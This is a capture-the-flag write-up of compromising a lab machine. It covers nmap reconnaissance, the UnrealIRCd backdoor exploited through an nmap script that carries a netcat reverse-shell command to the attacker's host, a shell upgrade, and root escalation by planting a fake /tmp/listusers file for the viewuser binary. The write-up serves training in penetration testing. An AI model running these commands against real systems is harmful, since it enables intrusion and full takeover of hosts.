### Recon

initiating reconnaissance:
```
nmap -sC -sV 10.10.10.117
```

With the following results:
```
Nmap scan report for 10.10.10.117
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A full port scan reveals that ports 6697, 8067 and 65534 are open and running UnrealIRCd. A version of this service was vulnerable to a backdoor command execution.

### Enumeration

Port 80 is open so let's try to enumerate directories with gobuster:
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.117
```


```
nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
```

```
Nmap scan report for 10.10.10.117
Host is up (0.21s latency).

PORT      STATE SERVICE
6697/tcp  open  ircs-u
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
8067/tcp  open  infi-async
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
65534/tcp open  unknown

```


# Initial foothold

The next obvious step would be to get a reverse shell on the machine by exploiting the UnrealIRCd backdoor vulnerability. After attempting to do that, I spent an hour trying to figure out why neither my netcat reverse or bind shells are not working. It turns out that if you add the flag “-n” which stands for “do not do any DNS or service lookups on any specified address”, the shell doesn’t work.

For now, set up a listener on the attack machine:
```
nc -lnvp 4444
```

Send a reverse shell to our listener from the target machine.
```
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.9 4444"  10.10.10.117
```

Upgrade to a better shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python -m http.server
```

```
ircd@irked:/usr/bin$ printf '/bin/sh' > /tmp/listusers
chmod a+x /tmp/listusers
viewuser
whoami
printf '/bin/sh' > /tmp/listusers
ircd@irked:/usr/bin$ chmod a+x /tmp/listusers
ircd@irked:/usr/bin$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-06-25 09:00 (:0)
# root
```

